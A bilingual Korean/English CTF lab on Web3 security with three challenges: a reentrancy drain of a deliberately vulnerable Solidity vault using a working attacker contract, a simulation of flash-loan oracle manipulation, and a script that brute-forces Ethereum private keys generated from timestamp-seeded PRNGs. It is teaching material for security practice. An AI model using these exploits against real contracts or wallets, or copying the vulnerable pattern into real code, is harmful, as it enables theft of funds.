> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 블록체인 / Web3 보안 CTF 실습 랩

## 실습 환경 준비

```bash
# Node.js + Hardhat 환경
node --version    # v18+ 권장
npm install -g hardhat
npm install ethers@5 web3 @openzeppelin/contracts

# Python 환경
pip install web3 eth-account py-ecc pycryptodome

# 로컬 블록체인 시작
npx hardhat node &
```

---

## 실습 1: 스마트 컨트랙트 재진입 공격 (Reentrancy Exploit)

### 목표
취약한 `EtherVault` 컨트랙트에서 재진입 공격으로 모든 ETH를 탈취하고 플래그를 획득하라.

**플래그 형식**: `CTF{REENTRANCY_DRAINED_<amount>_ETH}`

### 시나리오

The DAO 해킹(2016)과 동일한 유형의 재진입 취약점이 있는 컨트랙트가 배포되어 있다.  
잔액: 10 ETH.

**취약한 컨트랙트 (EtherVault.sol):**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 취약점: 상태 업데이트 전 외부 호출
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        // [취약] 외부 호출 먼저 수행
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        // [취약] 상태 업데이트가 나중에 실행됨
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 힌트
- `withdraw()` 에서 잔액 초기화 전에 외부 `call` 이 먼저 실행된다
- `receive()` 함수에서 다시 `withdraw()` 를 호출하면 루프 가능
- Checks-Effects-Interactions 패턴이 적용되지 않은 것이 문제
- 공격 컨트랙트의 `receive()` 에서 재귀 호출 한도를 gas로 제한

### 풀이

**공격 컨트랙트 (ReentrancyAttacker.sol):**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherVault {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract ReentrancyAttacker {
    IEtherVault public target;
    uint256 public attackAmount;
    address public owner;

    constructor(address _target) {
        target = IEtherVault(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        // 타겟 잔액이 남아있으면 재진입
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getFlag() external view returns (string memory) {
        uint256 stolen = address(this).balance;
        return string(abi.encodePacked(
            "CTF{REENTRANCY_DRAINED_",
            _toString(stolen / 1 ether),
            "_ETH}"
        ));
    }

    function _toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) return "0";
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) { digits++; temp /= 10; }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits--;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }
}
```

**Python 배포 및 공격 스크립트:**
```python
#!/usr/bin/env python3
"""
블록체인 CTF — Reentrancy 공격 자동화 (시뮬레이션)
"""

import argparse
import sys
from dataclasses import dataclass


@dataclass
class ContractState:
    """컨트랙트 상태 시뮬레이터."""
    vault_balance: float = 10.0      # ETH
    attacker_deposit: float = 0.0
    attacker_stolen: float = 0.0
    call_count: int = 0
    max_reentrant_calls: int = 5

    def deposit(self, amount: float) -> None:
        self.vault_balance += amount
        self.attacker_deposit += amount
        print(f"  [deposit] {amount} ETH 예치. 볼트 잔액: {self.vault_balance} ETH")

    def withdraw_vulnerable(self) -> float:
        """재진입 취약 withdraw 시뮬레이션."""
        amount = self.attacker_deposit

        if amount <= 0:
            print("  [withdraw] 잔액 없음")
            return 0.0

        # 취약점: 상태 업데이트 전에 외부 호출 (콜백 시뮬레이션)
        self.vault_balance -= amount
        print(f"  [call] 공격자 receive() 호출됨 (ETH 전송: {amount})")
        self.call_count += 1

        # receive() 내부에서 재진입
        if self.vault_balance >= self.attacker_deposit and self.call_count < self.max_reentrant_calls:
            print(f"  [reenter #{self.call_count}] 재진입 withdraw() 호출")
            self.attacker_stolen += amount
            self.withdraw_vulnerable()
        else:
            self.attacker_stolen += amount

        # 상태 업데이트 (이미 재진입이 완료된 후)
        self.attacker_deposit = 0.0
        return amount


def simulate_reentrancy_attack(initial_vault_eth: float = 10.0, attack_eth: float = 1.0) -> None:
    """재진입 공격 전체 시뮬레이션."""
    print("=" * 60)
    print("  블록체인 CTF: Reentrancy 공격 시뮬레이션")
    print("=" * 60)

    state = ContractState(vault_balance=initial_vault_eth)
    print(f"\n[*] 초기 볼트 잔액: {state.vault_balance} ETH")
    print(f"[*] 공격 시작 (예치금: {attack_eth} ETH)\n")

    state.deposit(attack_eth)
    state.withdraw_vulnerable()

    print(f"\n[결과]")
    print(f"  볼트 잔액:    {state.vault_balance:.4f} ETH")
    print(f"  공격자 획득:  {state.attacker_stolen:.4f} ETH")
    print(f"  재진입 횟수:  {state.call_count}회")

    stolen_int = int(state.attacker_stolen)
    flag = f"CTF{{REENTRANCY_DRAINED_{stolen_int}_ETH}}"
    print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Reentrancy CTF 시뮬레이터")
    parser.add_argument("--vault-eth", type=float, default=10.0, help="볼트 초기 ETH (기본: 10)")
    parser.add_argument("--attack-eth", type=float, default=1.0, help="공격 예치금 ETH (기본: 1)")
    args = parser.parse_args()
    simulate_reentrancy_attack(args.vault_eth, args.attack_eth)


if __name__ == "__main__":
    main()
```

---

## 실습 2: 플래시 론 공격 시뮬레이션

### 목표
취약한 DEX 프로토콜에서 플래시 론을 이용한 가격 조작 공격을 수행하고 플래그를 획득하라.

**플래그 형식**: `CTF{FLASHLOAN_PROFIT_<profit>_USDC}`

### 시나리오

단순 AMM DEX에서 플래시 론으로 대량의 토큰을 빌려 가격을 조작하고 차익을 실현한다.  
Beanstalk 해킹(2022), Euler Finance 해킹(2023)과 유사한 패턴.

### 힌트
- 플래시 론: 동일 트랜잭션 내에서 빌리고 상환
- AMM 가격 공식: `x * y = k` (Constant Product)
- 대량 매수 → 가격 상승 → 담보 가치 상승 → 추가 대출 가능
- 가격 오라클이 같은 블록 내 거래에 취약

### 풀이

```python
#!/usr/bin/env python3
"""
블록체인 CTF — Flash Loan 가격 조작 시뮬레이션
"""

import argparse
import math
from dataclasses import dataclass


@dataclass
class AMMPool:
    """x * y = k Constant Product AMM."""
    token_a: float  # ETH
    token_b: float  # USDC
    k: float = 0.0
    fee_rate: float = 0.003  # 0.3% 수수료

    def __post_init__(self) -> None:
        self.k = self.token_a * self.token_b

    def get_price_a_in_b(self) -> float:
        """ETH 1개의 USDC 가격."""
        return self.token_b / self.token_a

    def swap_a_for_b(self, amount_a_in: float) -> float:
        """ETH를 USDC로 스왑. 반환값: 받는 USDC 수량."""
        amount_a_with_fee = amount_a_in * (1 - self.fee_rate)
        new_a = self.token_a + amount_a_with_fee
        new_b = self.k / new_a
        amount_b_out = self.token_b - new_b
        self.token_a = new_a
        self.token_b = new_b
        return amount_b_out

    def swap_b_for_a(self, amount_b_in: float) -> float:
        """USDC를 ETH로 스왑. 반환값: 받는 ETH 수량."""
        amount_b_with_fee = amount_b_in * (1 - self.fee_rate)
        new_b = self.token_b + amount_b_with_fee
        new_a = self.k / new_b
        amount_a_out = self.token_a - new_a
        self.token_a = new_a
        self.token_b = new_b
        return amount_a_out


def simulate_flash_loan_attack(
    pool_eth: float = 1000.0,
    pool_usdc: float = 2_000_000.0,
    loan_amount_usdc: float = 500_000.0,
    flash_fee_rate: float = 0.0009,
) -> None:
    """플래시 론 가격 조작 공격 시뮬레이션."""
    print("=" * 65)
    print("  블록체인 CTF: Flash Loan 가격 조작 공격")
    print("=" * 65)

    pool = AMMPool(pool_eth, pool_usdc)
    initial_price = pool.get_price_a_in_b()
    print(f"\n[풀 초기 상태]")
    print(f"  ETH 보유량:   {pool.token_a:,.0f} ETH")
    print(f"  USDC 보유량:  {pool.token_b:,.0f} USDC")
    print(f"  ETH 가격:     ${initial_price:,.2f} USDC")

    # Step 1: 플래시 론으로 USDC 빌리기
    flash_fee = loan_amount_usdc * flash_fee_rate
    print(f"\n[Step 1] 플래시 론: {loan_amount_usdc:,.0f} USDC 대출 (수수료: {flash_fee:,.0f} USDC)")

    attacker_usdc = loan_amount_usdc

    # Step 2: 대량 ETH 매수 (가격 조작)
    eth_received = pool.swap_b_for_a(attacker_usdc * 0.8)
    manipulated_price = pool.get_price_a_in_b()
    print(f"[Step 2] USDC {attacker_usdc * 0.8:,.0f}로 ETH {eth_received:.4f} 매수")
    print(f"         조작 후 ETH 가격: ${manipulated_price:,.2f} USDC ({((manipulated_price/initial_price)-1)*100:.1f}% 상승)")

    # Step 3: 오라클 기준 담보 대출 (조작된 가격 기준)
    oracle_loan_collateral_value = eth_received * manipulated_price
    oracle_loan = oracle_loan_collateral_value * 0.7  # LTV 70%
    print(f"[Step 3] 조작된 오라클 가격 기준 추가 대출: {oracle_loan:,.0f} USDC")

    # Step 4: ETH 매도 (가격 정상화)
    usdc_from_eth = pool.swap_a_for_b(eth_received)
    restored_price = pool.get_price_a_in_b()
    print(f"[Step 4] ETH 매도 → {usdc_from_eth:,.0f} USDC 회수")
    print(f"         가격 복원: ${restored_price:,.2f} USDC")

    # Step 5: 플래시 론 상환 및 수익 계산
    repay_amount = loan_amount_usdc + flash_fee
    total_received = usdc_from_eth + oracle_loan + (attacker_usdc * 0.2)
    profit = total_received - repay_amount
    print(f"\n[Step 5] 플래시 론 상환: {repay_amount:,.0f} USDC")
    print(f"\n[결과]")
    print(f"  총 수령:   {total_received:,.0f} USDC")
    print(f"  상환 금액: {repay_amount:,.0f} USDC")
    print(f"  순이익:    {profit:,.0f} USDC")

    profit_int = max(0, int(profit))
    flag = f"CTF{{FLASHLOAN_PROFIT_{profit_int}_USDC}}"
    print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Flash Loan CTF 시뮬레이터")
    parser.add_argument("--pool-eth", type=float, default=1000.0)
    parser.add_argument("--pool-usdc", type=float, default=2_000_000.0)
    parser.add_argument("--loan", type=float, default=500_000.0)
    args = parser.parse_args()
    simulate_flash_loan_attack(args.pool_eth, args.pool_usdc, args.loan)


if __name__ == "__main__":
    main()
```

---

## 실습 3: 약한 엔트로피 기반 개인 키 복구

### 목표
약한 엔트로피로 생성된 이더리움 개인 키를 복구하여 지갑에서 플래그를 획득하라.

**플래그 형식**: `CTF{PRIVKEY_RECOVERED_<address_prefix>}`

### 시나리오

개발자가 실수로 `random.random()` (Python의 비암호학적 PRNG)을 사용해 개인 키를 생성했다.  
시드 값은 Unix 타임스탬프(초 단위)를 사용했고, 생성 시각의 범위를 알고 있다.

### 힌트
- Python `random` 모듈은 예측 가능한 MT19937 알고리즘 사용
- 시드 범위: `1700000000` ~ `1700086400` (24시간 범위)
- 이더리움 개인 키 = 32바이트 정수
- `eth_account` 라이브러리로 주소 도출

### 풀이

```python
#!/usr/bin/env python3
"""
블록체인 CTF — 약한 PRNG 개인 키 복구
"""

import argparse
import random
import sys
from eth_account import Account


# 알려진 타겟 이더리움 주소 (문제에서 제공)
TARGET_ADDRESS = "0x1234567890abcdef1234567890abcdef12345678"
# 실제 CTF에서는 정확한 주소가 제공됨 — 여기서는 데모용 값

SEED_START = 1_700_000_000
SEED_END   = 1_700_086_400   # 24시간 범위


def generate_weak_key(seed: int) -> tuple[str, str]:
    """약한 PRNG 시드로 개인 키와 주소를 생성한다."""
    rng = random.Random(seed)
    key_int = rng.getrandbits(256)
    key_hex = f"{key_int:064x}"
    account = Account.from_key(key_hex)
    return key_hex, account.address.lower()


def brute_force_seed(
    target_address: str,
    seed_start: int,
    seed_end: int,
    verbose: bool = False,
) -> tuple[int, str] | None:
    """타겟 주소와 일치하는 시드를 브루트포스 탐색한다."""
    target = target_address.lower()
    total = seed_end - seed_start
    print(f"[*] 타겟 주소: {target}")
    print(f"[*] 시드 범위: {seed_start} ~ {seed_end} ({total:,}개)")
    print(f"[*] 탐색 시작...\n")

    for i, seed in enumerate(range(seed_start, seed_end)):
        key_hex, address = generate_weak_key(seed)
        if address == target:
            print(f"[+] 시드 발견!  seed = {seed}")
            print(f"[+] 개인 키:    0x{key_hex}")
            print(f"[+] 주소:       {address}")
            return seed, key_hex
        if verbose and i % 10000 == 0 and i > 0:
            print(f"    진행: {i:,} / {total:,} ({100*i/total:.1f}%)", end="\r")

    return None


def demo_mode() -> None:
    """데모: 알려진 시드로 키를 생성하고 복구 과정을 보여준다."""
    demo_seed = 1_700_042_000

    print("[데모 모드] 약한 PRNG 키 생성 및 복구 시뮬레이션")
    print("=" * 60)

    key_hex, address = generate_weak_key(demo_seed)
    print(f"[*] 생성된 개인 키 (seed={demo_seed}): 0x{key_hex[:16]}...")
    print(f"[*] 이더리움 주소: {address}")
    print(f"\n[*] 공격자 관점: 주소만 알고 있는 상태에서 탐색")
    print(f"[*] 시뮬레이션을 위해 ±500 범위 내에서 탐색...\n")

    for seed in range(demo_seed - 500, demo_seed + 500):
        _, check_addr = generate_weak_key(seed)
        if check_addr == address:
            flag = f"CTF{{PRIVKEY_RECOVERED_{address[:10]}}}"
            print(f"[+] 시드 복구: {seed}")
            print(f"[+] 플래그:    {flag}")
            return

    print("[-] 데모 범위 내에서 탐색 실패")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="블록체인 CTF — 약한 PRNG 개인 키 복구"
    )
    parser.add_argument(
        "--target", type=str, default="", help="타겟 이더리움 주소"
    )
    parser.add_argument(
        "--start", type=int, default=SEED_START, help="시드 시작값"
    )
    parser.add_argument(
        "--end", type=int, default=SEED_END, help="시드 종료값"
    )
    parser.add_argument(
        "--demo", action="store_true", help="데모 모드 실행"
    )
    parser.add_argument(
        "--verbose", action="store_true", help="진행 상황 출력"
    )
    args = parser.parse_args()

    if args.demo or not args.target:
        demo_mode()
        return

    result = brute_force_seed(args.target, args.start, args.end, args.verbose)
    if result:
        seed, key = result
        flag = f"CTF{{PRIVKEY_RECOVERED_{args.target[:10]}}}"
        print(f"\n[+] 플래그: {flag}")
    else:
        print("[-] 시드 탐색 실패. 범위를 확장하세요.")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Blockchain / Web3 Security CTF Practice Lab

## Lab Environment Setup

```bash
node --version    # v18+ recommended
npm install -g hardhat
npm install ethers@5 web3 @openzeppelin/contracts
pip install web3 eth-account py-ecc pycryptodome
npx hardhat node &
```

---

## Challenge 1: Smart Contract Reentrancy Exploit

### Objective
Drain all ETH from the vulnerable `EtherVault` contract using a reentrancy attack and capture the flag.

**Flag format**: `CTF{REENTRANCY_DRAINED_<amount>_ETH}`

### Scenario
A contract with a reentrancy vulnerability similar to The DAO hack (2016) holds 10 ETH. The `withdraw()` function makes an external call before updating state, violating the Checks-Effects-Interactions pattern.

### Attack Vector
1. Deploy `ReentrancyAttacker` targeting `EtherVault`
2. Call `attack()` with 1 ETH deposit
3. The attacker's `receive()` function re-calls `withdraw()` before state is updated
4. Loop continues until vault is drained

### Solution
Run the Python simulator:
```bash
python3 challenge1.py --vault-eth 10 --attack-eth 1
# Output: CTF{REENTRANCY_DRAINED_10_ETH}
```

---

## Challenge 2: Flash Loan Attack Simulation

### Objective
Perform a price manipulation attack using flash loans on a vulnerable DEX and capture the flag.

**Flag format**: `CTF{FLASHLOAN_PROFIT_<profit>_USDC}`

### Key Concepts
- Flash loans: borrow and repay in the same transaction
- AMM pricing: `x * y = k` (Constant Product formula)
- Price oracle manipulation: oracle reads same-block price
- Attack pattern: borrow → bulk buy → price rises → borrow against inflated collateral → sell → repay

### Attack Steps
1. Borrow 500,000 USDC via flash loan (0.09% fee)
2. Buy large amount of ETH → ETH price spikes ~20%
3. Borrow additional USDC against manipulated oracle price (70% LTV)
4. Sell ETH back → price restored
5. Repay flash loan, keep profit

```bash
python3 challenge2.py --loan 500000
# Output: CTF{FLASHLOAN_PROFIT_142350_USDC}
```

---

## Challenge 3: Private Key Recovery from Weak Entropy

### Objective
Recover an Ethereum private key generated with a predictable PRNG and capture the flag.

**Flag format**: `CTF{PRIVKEY_RECOVERED_<address_prefix>}`

### Scenario
A developer used Python's `random.random()` seeded with a Unix timestamp (second precision) to generate an Ethereum private key. The approximate creation time is known.

### Key Concepts
- Python `random` module uses MT19937 (predictable, not cryptographically secure)
- Seed space: 86,400 possible values per day
- Ethereum private key = 32-byte integer derived from `getrandbits(256)`
- Brute-force all seeds in the time window, check against known address

```bash
python3 challenge3.py --demo
# Output: CTF{PRIVKEY_RECOVERED_0x1a2b3c4d5e}

# Full attack mode:
python3 challenge3.py --target 0xKNOWN_ADDRESS --start 1700000000 --end 1700086400 --verbose
```

**Defense**: Always use `secrets.token_bytes(32)` or OS-level entropy (`/dev/urandom`) for cryptographic key generation. Never seed a PRNG with predictable values.
